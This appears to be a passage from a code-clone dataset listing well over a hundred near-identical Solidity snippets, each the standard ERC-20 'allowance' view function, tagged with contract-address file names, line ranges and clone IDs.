</source>
<source file="systems/source-code/0x14cf1d2a1da97600a7489c87a6d8bb57eb1fbc07.sol" startline="59" endline="61" pcid="592">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xDBc4b8F7D65167C5f44426dbb95Ec8921F629386.sol" startline="76" endline="78" pcid="7791">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x766d176a78F7cD88Ea86f9b18b72FF093b4e1DC9.sol" startline="79" endline="81" pcid="4419">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x441b741A92A2f35EA521918D3732D7449273EBE5.sol" startline="74" endline="76" pcid="2512">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x73Ff82219f9b9ba3fEbe8aed26C159378D4e00B2.sol" startline="80" endline="82" pcid="4272">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xc1143D26004Ec3253eF0aB4500113105164aA789.sol" startline="82" endline="84" pcid="6927">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xDee33C0f9d5395192ec09e6d4B3753015781C26A.sol" startline="74" endline="76" pcid="7991">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xBD13AACef22A780AB305c9478a801Ce8752aa7aB.sol" startline="78" endline="80" pcid="6780">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xE34d100c26D21eA743c05A18DC0cbc5d223e69a1.sol" startline="76" endline="78" pcid="8231">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x9074b21AB3452ABC15F7e15B6b7233EBe9Ed731f.sol" startline="403" endline="405" pcid="5284">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xF92050985936150572FCA5d8307bfd35771CDB54.sol" startline="72" endline="74" pcid="9077">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xE9Ce9ff1891e1F38778FCEEFC53350eA3A7370D7.sol" startline="75" endline="77" pcid="8456">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xe0292d64ff7319abd8083e2bdae5ba81a56ada05.sol" startline="62" endline="64" pcid="8049">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x80243a2b6dfb564459fec3e729fda998a4b7a979.sol" startline="77" endline="79" pcid="4729">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xc49a9fe7c7B41545edfF6B2F2be7662EB588279C.sol" startline="151" endline="153" pcid="7081">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x957b9B7288D04A507437a46AE069bbbeeC8F6c83.sol" startline="76" endline="78" pcid="5435">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x545189e64a542b50e06902bceec0f536c662f46d.sol" startline="76" endline="78" pcid="3150">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xeFA7f35b824bB9A8696DAeA87172c466f6d8D5A2.sol" startline="82" endline="84" pcid="8739">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x30c12bcdd3f52ec30ed4686de301e710e862eb55.sol" startline="77" endline="79" pcid="1526">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x4504921b0d800eca1770f89740b7aaa8f3f57fb9.sol" startline="81" endline="83" pcid="2576">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x99818798AedD80Fef824086eF10411C89009e174.sol" startline="77" endline="79" pcid="5577">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x515Eab35fB6F9687e0D6cd8B796aEF5E7d15064F.sol" startline="403" endline="405" pcid="3029">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x67d726579cdb18830da61472da171f56028b0df1.sol" startline="59" endline="61" pcid="3853">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3a862ec30f2b3Ce5419177221E9E1B151AcC0016.sol" startline="78" endline="80" pcid="1951">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xb628B6198E2320437e8a9FF1e72A9FF3f1636cf9.sol" startline="82" endline="84" pcid="6630">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xB34429e7E522e8cDdDC4D4a49E98E073bdfEa29a.sol" startline="46" endline="48" pcid="6549">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x2e146811a317ba5Eb77209C942b186f67a65E801.sol" startline="79" endline="81" pcid="1372">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x9e765D69c813b6A14835Ff2299aF610561DA2D06.sol" startline="76" endline="78" pcid="5706">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x58f43Dc7968012f4DB78EC97A36c9998658ffCcC.sol" startline="74" endline="76" pcid="3346">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x98D29fe112bFce3C568b3e7B56CA95F4f684f2E2.sol" startline="79" endline="81" pcid="5547">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x8236e50E0EC3178c05910A37B9CbDd98bB013A45.sol" startline="73" endline="75" pcid="4889">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x42e8ECeca237eA7FA8b4B52F14Ca6C3d3c3213dc.sol" startline="51" endline="53" pcid="2476">
    function allowance(address owner, address spender) public view returns (uint256) {
        return allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x08f9862424E2A8F7d7BDcd2c8C33C12d6cFbd43e.sol" startline="77" endline="79" pcid="249">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xe6817d8DC697e075e23273385e97D3528Ddd08d1.sol" startline="76" endline="78" pcid="8336">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x52739F8b5C2bCD8290403e21463615B8B952f049.sol" startline="77" endline="79" pcid="3060">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x5bf8D2aedA8ECE0373C4F0C5B28633DF3A5aB834.sol" startline="139" endline="141" pcid="3516">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3C44CdD91a695287BAECF13a876B599e30F40Ae8.sol" startline="79" endline="81" pcid="2097">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x8e828c6761A342fa4204d8827A8b81B35904471B.sol" startline="77" endline="79" pcid="5218">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x248B4A2b9897b72994722C0e259BC1Eca38eAbf0.sol" startline="79" endline="81" pcid="1113">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x156ba8A652411cd1F4fFbdA89f96172d5C76bD3A.sol" startline="150" endline="152" pcid="616">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x571d1b19e4eaDC8840499d3A408a4CD3fa31f5A6.sol" startline="73" endline="75" pcid="3275">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x6e45ced3238f28085a8a9e8d93e273013ad9d5a4.sol" startline="75" endline="77" pcid="4048">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x6557Eb95E84F9247AFEc5e988b4F9532B80A4497.sol" startline="148" endline="150" pcid="3818">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xc4763759BDa9657Cfd06a1613Fc828afD74b70Fa.sol" startline="79" endline="81" pcid="7069">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xa342B0b37B2a6e213c61B1f19b53dFD3dF82ED53.sol" startline="76" endline="78" pcid="5927">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x116C9ACc3e70e542b1F2609868Bc4a3000797cb3.sol" startline="79" endline="81" pcid="465">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x9a5d0F32B00BDB418D7667AE36d36eA15FDe594e.sol" startline="77" endline="79" pcid="5631">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x55C24F7AdB76f73E9d7FEF837FA0538edBd00280.sol" startline="77" endline="79" pcid="3195">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xD1E4a04142D5B5174C6E7129C11740F73d721f5A.sol" startline="76" endline="78" pcid="7504">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xdd34428a0dd260cc83608d16abcd1f8baf0c097c.sol" startline="256" endline="258" pcid="7876">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x42825e496a72B5E3278af637a45B712E49c061A0.sol" startline="80" endline="82" pcid="2466">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xff5c2d7Ea91Cb2a88e58E840f24088B5b445834A.sol" startline="79" endline="81" pcid="9348">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x91448BdD0ef6810de6E4a8B3Ba82590ab70D5b95.sol" startline="78" endline="80" pcid="5320">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xfFc50B460871D6dF13CA15F24c29cB646B6606f5.sol" startline="79" endline="81" pcid="9363">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xccD47BEeEf5E57708853902581289A950E4E9722.sol" startline="77" endline="79" pcid="7282">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x32eC423819A8C80CC7B609C20961371e75E54FA0.sol" startline="79" endline="81" pcid="1583">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xfDC34A848cBc058f5D246D22b3d9B96eB7d5a301.sol" startline="76" endline="78" pcid="9279">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x73f3b1b22f21222c593195558a8c76558f1e8ce8.sol" startline="76" endline="78" pcid="4257">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x1E8203DF1f5488659b9Ff0F39366014Df7d7068D.sol" startline="77" endline="79" pcid="962">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xBe43ad4F6F0B27228aC7E54974a57470862FC8Bf.sol" startline="80" endline="82" pcid="6795">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x13d0A3A7D4Ca790E93874a93ED664a301291bBEe.sol" startline="76" endline="78" pcid="535">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xafC5AE8b1149E8b488Ef254c4Ee4FcfA4c3eE124.sol" startline="77" endline="79" pcid="6428">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xD491aC27192A0adc7a149Ff3df75a93265Ad83eB.sol" startline="79" endline="81" pcid="7593">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x2E28a09452b865B719676E3629Fd002222D1111A.sol" startline="79" endline="81" pcid="1387">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x033B28BE598a95363830624C0601E58AB03e9922.sol" startline="78" endline="80" pcid="127">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x17A5c49Cb48bf49cc10D1Ec05fE899Bb447811Fd.sol" startline="77" endline="79" pcid="717">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x059DCcB34DeD089dBCe4d1CCd975d6D38891e138.sol" startline="79" endline="81" pcid="162">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3063792385BB315E7016f3E4eFb0560b567DB022.sol" startline="79" endline="81" pcid="1491">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x705418103a3623918d0f718465dacbfd4c30df74.sol" startline="56" endline="58" pcid="4121">
    function allowance(address owner, address spender) public view returns (uint256){
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x0f572144eaCF6e05F6c82b764CD1c722a6b22723.sol" startline="82" endline="84" pcid="405">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3D9efe658017c9f4e19E61c4dE211FB55B0E47d6.sol" startline="72" endline="74" pcid="2235">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3D0F6fAF8Ed7c849742861D7C9C7F0Bc1E7Fd116.sol" startline="78" endline="80" pcid="2186">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x2AE6bAa928cFeD647807104d4de73aA779a8f433.sol" startline="77" endline="79" pcid="1281">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3505c70Dbf2Cc4ECD84Dd0Bed04f8126c26Ab909.sol" startline="82" endline="84" pcid="1669">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xaa268b4717907181f8826e1e5bC6ffC4BA3da5A0.sol" startline="72" endline="74" pcid="6186">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x6495b9266304551eBa87fF9aD9c407Efd3c0a71c.sol" startline="75" endline="77" pcid="3806">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="167" endline="169" pcid="5995">
  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
</source>
<source file="systems/source-code/0x11067Cc96F63B2b375fb740FEee95aA2009A5249.sol" startline="80" endline="82" pcid="450">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3ce7CAfDEB197967161757d8a44e60e9Bf58bC10.sol" startline="77" endline="79" pcid="2171">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x6cEbef0D2a75E294aEdb3641e77F63CF3ebabb8B.sol" startline="75" endline="77" pcid="3988">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xB95dAA5D1A88eD95C2d32f4b48A40c5cC48EDfed.sol" startline="39" endline="44" pcid="6698">
    function allowance(
        address account,
        address spender
    ) public view returns (uint256) {
        return _allowances[account][spender];
    }
</source>
<source file="systems/source-code/0x31106529aB0136C568C856A9A07dDbBAe8512865.sol" startline="76" endline="78" pcid="1550">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x5d78329DB4EddA91c08E819b0E6a952ebBD05018.sol" startline="79" endline="81" pcid="3566">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xc0df2A6330877c7632051E2A30e8Eb732fa1aE02.sol" startline="72" endline="74" pcid="6912">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xbe8784905d6EfEf6935E715Cf2075dF356807306.sol" startline="76" endline="78" pcid="6812">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x9f956D811170c17aEeA2382b44132520D7A63701.sol" startline="75" endline="77" pcid="5751">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x648a2725f5f2Fc16D9c32861cb3045A0D64fF718.sol" startline="74" endline="76" pcid="3791">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="419" endline="421" pcid="9104">
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }
</source>
<source file="systems/source-code/0x41074D4fAe6571188B306Ed26636a00E768E7Bb9.sol" startline="151" endline="153" pcid="2388">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xf35aD950b9A888FF9E9c25B9a71c19dDF57d61F4.sol" startline="79" endline="81" pcid="8868">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xAAb2332D528D2C636a3c1F47dF49472A9341149b.sol" startline="79" endline="81" pcid="6231">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x6277c6BC834f6A1cCa9905696a5b6d4f459BC736.sol" startline="79" endline="81" pcid="3761">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x4BAdfe3A6691C6d4842075C861dB965597E4D895.sol" startline="75" endline="77" pcid="2824">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x55D55083c478237062763c41CBd20209841a0459.sol" startline="78" endline="80" pcid="3210">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x4d93ea7ef293ed2ca2d4cc9723f5e2c0c8e09dec.sol" startline="76" endline="78" pcid="2929">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xB1426cE1931Bc2f72fF5eEcFf831679B1fe52c3b.sol" startline="74" endline="76" pcid="6518">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x42237AC5Aed08d64FEAE4817fa1F0282087447f7.sol" startline="79" endline="81" pcid="2436">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x033Be8705C262bb2A12da0274297790e9479CCe1.sol" startline="76" endline="78" pcid="142">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xDe77F59a385B50d78aeB7C646d9dF1E4fD76f1a4.sol" startline="80" endline="82" pcid="7946">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x14CbB17f7B2adad6F00A468e7E1991969c6b3b8E.sol" startline="82" endline="84" pcid="580">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xb07F1e635FbA15234B11A351Ee03Da67D11111B2.sol" startline="80" endline="82" pcid="6503">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x66bc620635dd4e5bebdc135489e7cb6f660b2064.sol" startline="72" endline="74" pcid="3841">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xe6306Af140F6eefa1d461Ff04a549D51FF4dd16B.sol" startline="75" endline="77" pcid="8321">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xca1d8fef30539ba8f40e11ad60d8b4a863874266.sol" startline="75" endline="77" pcid="7206">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x020b7C91ca0C63477DF2f68ac47A6c41a370CE37.sol" startline="77" endline="79" pcid="68">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x951f6AC91566cC392D051278A1E921ECF56a9B6F.sol" startline="75" endline="77" pcid="5405">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x5aa699e74fb24d7f1d04e2392df05133da7cadc7.sol" startline="79" endline="81" pcid="3428">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x173F3b04bD4d245b0Bea67CcA11c18B062098EaF.sol" startline="78" endline="80" pcid="696">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xcAE6d8F16193526B9973C93096F0B9B788af999F.sol" startline="80" endline="82" pcid="7236">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x48ae9c1f0b3ef9f94c0dff437f8f96d49f636e6c.sol" startline="72" endline="74" pcid="2722">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x97599936D137EFDD11Eaa2989F58f5a00BCd2803.sol" startline="74" endline="76" pcid="5485">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x23ffd2f59ec758388282634cda63d6dc1e3120f2.sol" startline="151" endline="153" pcid="1095">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x2362dE6A331ca1f0f5243CE99792dbEdab68D184.sol" startline="80" endline="82" pcid="1067">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x837c26F4D6Be1E7466Fe92fE138b8c4af8C59D0C.sol" startline="79" endline="81" pcid="4934">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xcfd07da825fbc71855ce35cc5953336b23e27a82.sol" startline="76" endline="78" pcid="7429">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x35539cc6f1f1c0449474fdaaa0939893457163da.sol" startline="77" endline="79" pcid="1786">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x075D3f6AcC15Caf4F8699D72Bc760A09f5842C3f.sol" startline="79" endline="81" pcid="192">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xe542Cc82fcd14a249D0Bc3835ef4e3730616b190.sol" startline="81" endline="83" pcid="8291">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3c8B8B3D57AE533C8A34A290327024f915335CA9.sol" startline="78" endline="80" pcid="2137">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x0990031433A1C58Ec2A2AFD43154bDD036BA794d.sol" startline="76" endline="78" pcid="279">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xe10f1b5466b361c9c8c735021A6d00CDea855763.sol" startline="78" endline="80" pcid="8093">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x9C4595f9D874E2853bc5E57bB98Ca764cBa684d0.sol" startline="80" endline="82" pcid="5691">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xC2DF29A6Ee0a3C12446E45Ad1340A30fEF33a6A9.sol" startline="79" endline="81" pcid="6972">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xea0C5622A2E88392b1edb53e495a28491aC11fBA.sol" startline="81" endline="83" pcid="8471">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x71D87A7100c195679C7731039d37EFBfF1c19e6a.sol" startline="150" endline="152" pcid="4170">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x70d8b31f4eeE0E9988D0b196531205A9D30Ad104.sol" startline="79" endline="81" pcid="4157">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x865Ca5Fb63230fC0e75Ab51EB04895e3A8aD8808.sol" startline="73" endline="75" pcid="5004">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x30b64f3Ff111F7B1DBD35a92e9a5A7f1395eb2eD.sol" startline="80" endline="82" pcid="1511">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x560506f3a7e8AD0307c07ab44cd1e885bA936575.sol" startline="76" endline="78" pcid="3225">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x1dD5Cf1BC9611382979F365097516380cfa35D97.sol" startline="75" endline="77" pcid="928">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3c36CB64F2255b3558b0056E3c2F5C025E8B7a6d.sol" startline="81" endline="83" pcid="2082">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x78102a37f04eb263c1f626702f1c1f98618ea3de.sol" startline="151" endline="153" pcid="4505">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xd80f2392f3592471ef0a0163441db092268c19ee.sol" startline="89" endline="91" pcid="7730">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xdeE18b2a1ac44f22E4E3Ee3de6AeD146877bCe50.sol" startline="79" endline="81" pcid="7976">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x9338e0a6861e995db04cea5b63e1b94faba2291c.sol" startline="40" endline="42" pcid="5344">
    function allowance(address owner, address spender) public view returns (uint256) {
        return a[owner][spender];
    }
</source>
<source file="systems/source-code/0x958e1604174Ea6BD0932ca9E577f01088499897a.sol" startline="79" endline="81" pcid="5450">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xd0cD86CA2768C13980fE496ca78bC72Ed8f2bE8B.sol" startline="79" endline="81" pcid="7444">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xecF790443697567D67022c757ABE80ac4648dA0E.sol" startline="79" endline="81" pcid="8673">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
